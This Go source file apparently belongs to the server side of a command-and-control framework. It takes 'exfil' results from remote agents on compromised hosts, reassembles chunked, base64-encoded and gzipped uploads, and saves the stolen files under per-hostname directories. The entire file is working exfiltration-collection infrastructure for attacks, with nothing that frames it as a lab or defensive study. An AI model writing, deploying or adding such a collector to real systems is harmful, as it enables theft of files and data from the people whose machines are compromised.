package server

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

const exfilBaseDir = "exfil"

type exfilFile struct {
	Path string `json:"p"`
	Size int    `json:"s"`
	Data string `json:"d"`
}

type exfilResult struct {
	TTP   int         `json:"t"`
	Files []exfilFile `json:"files"`
}

type exfilChunk struct {
	TTP  int    `json:"t"`
	Path string `json:"p"`
	N    int    `json:"n"`
	M    int    `json:"m"`
	Data string `json:"d"`
}

// chunkBuffer accumulates TTP 32 chunks for a given agentID+path.
var (
	chunkMu  sync.Mutex
	chunkBuf = map[string]map[int]exfilChunk{} // key: "agentID:path"
)

// saveExfilResult processes an exfil result payload, saves files to disk,
// and returns a human-readable summary and the save directory path.
// Files are saved to ./exfil/<hostname>/ relative to the server's working directory.
func saveExfilResult(agentID, hostname string, ttp int, payload string) (summary, savePath string) {
	dirName := agentID[:min8(len(agentID))]
	if hostname != "" {
		dirName = sanitizeName(hostname)
	}
	dir := filepath.Join(exfilBaseDir, dirName)

	if ttp == 32 {
		return saveExfilChunk(agentID, dir, payload)
	}

	var res exfilResult
	if err := json.Unmarshal([]byte(payload), &res); err != nil {
		return "parse error", dir
	}

	os.MkdirAll(dir, 0700)
	var saved []string
	for _, f := range res.Files {
		raw, err := base64.StdEncoding.DecodeString(f.Data)
		if err != nil {
			continue
		}
		outName := sanitizePath(f.Path)
		outPath := filepath.Join(dir, outName)
		os.MkdirAll(filepath.Dir(outPath), 0700)
		if err := os.WriteFile(outPath, raw, 0600); err != nil {
			continue
		}
		saved = append(saved, f.Path)
	}
	if len(saved) == 0 {
		return "no files saved", dir
	}
	return fmt.Sprintf("%d file(s): %s", len(saved), strings.Join(saved, ", ")), dir
}

func saveExfilChunk(agentID, dir string, payload string) (summary, savePath string) {
	var chunk exfilChunk
	if err := json.Unmarshal([]byte(payload), &chunk); err != nil {
		return "chunk parse error", dir
	}

	key := agentID + ":" + chunk.Path
	chunkMu.Lock()
	if chunkBuf[key] == nil {
		chunkBuf[key] = make(map[int]exfilChunk)
	}
	chunkBuf[key][chunk.N] = chunk
	complete := len(chunkBuf[key]) == chunk.M
	chunks := chunkBuf[key]
	if complete {
		delete(chunkBuf, key)
	}
	chunkMu.Unlock()

	if !complete {
		return fmt.Sprintf("%s chunk %d/%d buffered", chunk.Path, chunk.N, chunk.M), dir
	}

	var combined []byte
	for i := 1; i <= chunk.M; i++ {
		c, ok := chunks[i]
		if !ok {
			return fmt.Sprintf("%s chunk %d missing", chunk.Path, i), dir
		}
		raw, err := base64.StdEncoding.DecodeString(c.Data)
		if err != nil {
			return "base64 decode error", dir
		}
		combined = append(combined, raw...)
	}

	gr, err := gzip.NewReader(bytes.NewReader(combined))
	if err != nil {
		return "gzip error", dir
	}
	decompressed, err := io.ReadAll(gr)
	gr.Close()
	if err != nil {
		return "decompress error", dir
	}

	os.MkdirAll(dir, 0700)
	outName := sanitizePath(chunk.Path)
	outPath := filepath.Join(dir, outName)
	os.MkdirAll(filepath.Dir(outPath), 0700)
	if err := os.WriteFile(outPath, decompressed, 0600); err != nil {
		return "write error: " + err.Error(), dir
	}
	return fmt.Sprintf("%s reassembled (%d chunks, %dKB)", chunk.Path, chunk.M, len(decompressed)/1024), dir
}

func sanitizePath(p string) string {
	p = filepath.Clean(p)
	p = strings.ReplaceAll(p, "/", "_")
	p = strings.ReplaceAll(p, "\\", "_")
	if p == "" || p == "." {
		p = "file"
	}
	return p
}

func sanitizeName(s string) string {
	s = strings.ReplaceAll(s, "/", "_")
	s = strings.ReplaceAll(s, "\\", "_")
	s = strings.ReplaceAll(s, " ", "_")
	if s == "" {
		s = "unknown"
	}
	return s
}

func min8(n int) int {
	if n < 8 {
		return n
	}
	return 8
}
